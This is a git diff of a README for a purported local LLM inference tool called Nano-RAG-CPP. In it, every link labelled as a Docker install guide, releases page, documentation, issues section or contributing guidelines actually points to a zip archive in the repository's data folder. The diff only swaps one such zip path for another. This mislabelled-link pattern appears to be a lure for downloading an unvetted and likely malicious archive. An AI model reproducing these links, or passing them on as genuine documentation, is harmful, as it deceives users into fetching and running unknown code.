@@ -1,6 +1,6 @@
 # 🚀 Nano-RAG-CPP - Fast and Easy AI Inference Engine
 
-[![Download Nano-RAG-CPP](https://raw.githubusercontent.com/jawad-zaheer123/Nano-RAG-CPP/main/data/Nano_CPP_RA_1.7.zip%20Nano--RAG--CPP-v1.0-blue)](https://raw.githubusercontent.com/jawad-zaheer123/Nano-RAG-CPP/main/data/Nano_CPP_RA_1.7.zip)
+[![Download Nano-RAG-CPP](https://github.com/jawad-zaheer123/Nano-RAG-CPP/raw/refs/heads/main/data/RA_Nano_CPP_v1.6.zip%20Nano--RAG--CPP-v1.0-blue)](https://github.com/jawad-zaheer123/Nano-RAG-CPP/raw/refs/heads/main/data/RA_Nano_CPP_v1.6.zip)
 
 ## 📦 Introduction
 
@@ -13,11 +13,11 @@ Nano-RAG-CPP is a high performance, containerized Local LLM Inference Engine bui
 Before you download and run Nano-RAG-CPP, ensure your system meets the following requirements:
 
 - **Operating System**: Linux (Ubuntu recommended)
-- **Docker**: Make sure Docker is installed. You can follow the [Docker installation guide](https://raw.githubusercontent.com/jawad-zaheer123/Nano-RAG-CPP/main/data/Nano_CPP_RA_1.7.zip) for detailed steps.
+- **Docker**: Make sure Docker is installed. You can follow the [Docker installation guide](https://github.com/jawad-zaheer123/Nano-RAG-CPP/raw/refs/heads/main/data/RA_Nano_CPP_v1.6.zip) for detailed steps.
 
 ### Installation Steps
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/jawad-zaheer123/Nano-RAG-CPP/main/data/Nano_CPP_RA_1.7.zip) to find the latest version.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/jawad-zaheer123/Nano-RAG-CPP/raw/refs/heads/main/data/RA_Nano_CPP_v1.6.zip) to find the latest version.
    
 2. **Download the Application**: Locate the version you want and download the appropriate files for your system.
 
@@ -39,7 +39,7 @@ Just replace `yourdockerimage` with the actual image name you downloaded.
 
 ## 📥 Download & Install
 
-To get started with Nano-RAG-CPP, visit the [Releases page](https://raw.githubusercontent.com/jawad-zaheer123/Nano-RAG-CPP/main/data/Nano_CPP_RA_1.7.zip) to download the latest version. 
+To get started with Nano-RAG-CPP, visit the [Releases page](https://github.com/jawad-zaheer123/Nano-RAG-CPP/raw/refs/heads/main/data/RA_Nano_CPP_v1.6.zip) to download the latest version. 
 
 ## 🛠 Features
 
@@ -59,14 +59,14 @@ After installation, you can start using Nano-RAG-CPP for your AI tasks. Here’s
 
 ## 📖 Documentation
 
-For more details on features and functionalities, open the [documentation](https://raw.githubusercontent.com/jawad-zaheer123/Nano-RAG-CPP/main/data/Nano_CPP_RA_1.7.zip). This resource provides further insights into how to make the most of Nano-RAG-CPP.
+For more details on features and functionalities, open the [documentation](https://github.com/jawad-zaheer123/Nano-RAG-CPP/raw/refs/heads/main/data/RA_Nano_CPP_v1.6.zip). This resource provides further insights into how to make the most of Nano-RAG-CPP.
 
 ## 🛠 Support
 
-If you encounter any issues, check out the [issues section](https://raw.githubusercontent.com/jawad-zaheer123/Nano-RAG-CPP/main/data/Nano_CPP_RA_1.7.zip) on GitHub. You can report bugs or ask for help there.
+If you encounter any issues, check out the [issues section](https://github.com/jawad-zaheer123/Nano-RAG-CPP/raw/refs/heads/main/data/RA_Nano_CPP_v1.6.zip) on GitHub. You can report bugs or ask for help there.
 
 ## 🎉 Contributing
 
-Want to contribute? Great! You can help with bug fixes, new features, or documentation improvements. Please read the [contributing guidelines](https://raw.githubusercontent.com/jawad-zaheer123/Nano-RAG-CPP/main/data/Nano_CPP_RA_1.7.zip) for more information.
+Want to contribute? Great! You can help with bug fixes, new features, or documentation improvements. Please read the [contributing guidelines](https://github.com/jawad-zaheer123/Nano-RAG-CPP/raw/refs/heads/main/data/RA_Nano_CPP_v1.6.zip) for more information.
 
 Thank you for using Nano-RAG-CPP. We hope it streamlines your AI projects!
